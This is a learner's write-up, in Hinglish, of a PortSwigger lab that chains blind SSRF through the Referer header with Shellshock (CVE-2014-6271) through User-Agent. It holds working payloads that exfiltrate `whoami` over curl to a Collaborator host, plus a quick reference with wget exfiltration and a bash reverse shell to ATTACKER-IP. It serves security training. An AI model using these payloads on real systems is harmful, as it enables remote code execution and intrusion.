// PortSwigger Labs ---> Platform
---
## Lab: 6 — Blind SSRF With Shellshock Exploitation
## Difficulty Level : 🔴 EXPERT


---

### Where I Found Vulnerability ?
- **URL:** `/product?productId=1`
- **Parameters:** `User-Agent` header + `Referer` header
- **Two vulnerabilities chained:**
  - 🔗 Blind SSRF → `Referer` header se internal server hit kiya
  - 💥 Shellshock (CVE-2014-6271) → `User-Agent` header se RCE

---

### What is Shellshock ? 🐚
> Shellshock ek **Bash vulnerability (2014)** hai jisme specially crafted environment variable se **arbitrary commands execute** ho jaate hain.

```bash
# Normal Bash function:
greet() { echo "Hello"; }

# Shellshock Payload — function ke baad command inject:
() { :; }; echo "HACKED"
#    ↑              ↑
# Fake function    Ye execute ho jaata hai!
```
- **CVE:** CVE-2014-6271
- **CVSS Score:** 10.0 (Maximum) 🚨
- **Affected:** Bash 1.0.3 → 4.3 (almost all old Linux servers)

---

### Steps ?
1. Kisi bhi product pe jao aur Burp mein intercept karo
2. Request ko **Intruder** mein bhejo
3. `Referer` header mein `http://192.168.0.§X§:8080/` set karo — `X` ko payload position banao
4. `User-Agent` header mein **Shellshock payload** daalo with Collaborator URL:
```
() { :; }; curl http://YOUR-COLLABORATOR-ID.oastify.com/`whoami`
```
5. Intruder run karo → Numbers `1-255` bruteforce karo Referer IP ke liye
6. Burp Collaborator → **Poll Now** click karo
7. Incoming HTTP request mein URL path dekho → `/peter-XXXXXX` — ye OS username hai
8. Lab mein username submit karo → ✅ Solved

---

### Working Payloads ?

**User-Agent (Shellshock + OOB):**
```bash
() { :; }; curl http://48awt6rev5owyxnsl743bzjib9h25tti.oastify.com/`whoami`
```

**Referer (Blind SSRF - IP Bruteforce):**
```
http://192.168.0.X:8080/
```

**Payload Breakdown:**
```
() { :; };         ← Shellshock trigger (malformed bash function)
curl               ← Command jo execute hogi server pe
http://COLLAB/     ← Tumhara Collaborator URL
`whoami`           ← Command substitution — output URL mein append hoga
                      Server → GET /peter-p0L6PW → Collaborator
```

---

### Why it Worked ? 🧠

**Step 1 — Blind SSRF via Referer:**
- Server `Referer` header ki URL ko background mein fetch kar raha tha
- `192.168.0.X:8080` pe ek internal server tha jo Bash CGI use karta tha
- Referer bruteforce se sahi IP (167 ya koi bhi) mili jahan server tha

**Step 2 — Shellshock via User-Agent:**
- Internal server CGI script HTTP headers ko **Bash environment variables** mein pass karta tha
- `User-Agent` header → `HTTP_USER_AGENT` environment variable bana
- Shellshock ne is variable ko parse kiya aur `curl whoami` execute ho gayi
- `whoami` ka output (`peter-XXXXXX`) Collaborator URL mein append hua
- Collaborator pe incoming request mein username dikh gaya 👀

```
Attack Chain:
Burp Intruder
     ↓
Referer: 192.168.0.167:8080  ← Blind SSRF (internal server hit)
     ↓
Internal CGI Server (Bash)
     ↓
User-Agent parsed as env var  ← Shellshock triggers
     ↓
curl http://COLLABORATOR/`whoami`  ← RCE executed
     ↓
Collaborator receives: GET /peter-p0L6PW  ← Username leaked!
```

---

### What I Learned ? 🎓

- 🔗 **Vulnerability Chaining** — Ek vulnerability akeli weak ho sakti hai, lekin chain karo toh devastating: `Blind SSRF → Shellshock → RCE`
- 🐚 **Shellshock** sirf old servers pe kaam karta hai lekin real bug bounty mein aaj bhi milta hai legacy systems mein
- 📡 **Out-of-Band (OOB) Data Exfiltration** — Response nahi dikha, lekin `whoami` output Collaborator URL ke through leak hua — ye Blind scenarios mein gold hai
- 🎯 **HTTP Headers = Attack Surface** — Sirf URL parameters nahi, `User-Agent`, `Referer`, `X-Forwarded-For` sab test karo
- 🔢 **Intruder IP Bruteforce** — Jab internal IP pata na ho, `1-255` range fuzz karo — 200 OK wali IP real server hai

---

### Shellshock Quick Reference 📋
```bash
# Basic Test
() { :; }; echo "Vulnerable"

# RCE via curl (OOB)
() { :; }; curl http://COLLABORATOR/`whoami`

# RCE via wget
() { :; }; wget http://COLLABORATOR/`id`

# Reverse Shell
() { :; }; bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

---
